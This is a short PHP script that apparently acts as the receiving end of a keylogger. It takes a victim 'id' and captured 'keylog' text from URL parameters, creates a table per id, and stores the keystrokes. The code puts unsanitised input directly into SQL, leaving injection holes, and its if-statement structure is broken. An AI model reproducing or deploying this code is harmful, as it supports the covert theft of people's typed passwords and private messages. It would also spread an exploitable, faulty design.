<?php
	include_once 'sql.php';

if( $_GET["id"] || $_GET["keylog"])
$hek = $_GET["id"];
$keylog = $_GET["keylog"];

{
  
    $query = "SELECT * FROM $hek";
	$result = mysqli_query($conn, $query);

	if(empty($result)) {
    	            $sql = "CREATE TABLE $hek (
                          keylog varchar(429496729) NOT NULL
                          );";
                	$res = mysqli_query($conn, $sql);
                	echo $res;

            }

$sql = "INSERT INTO $hek (keylog) VALUES ('$keylog')";   

        }
        if ($conn->query($sql) === TRUE) {
    echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

$conn->close();
?>
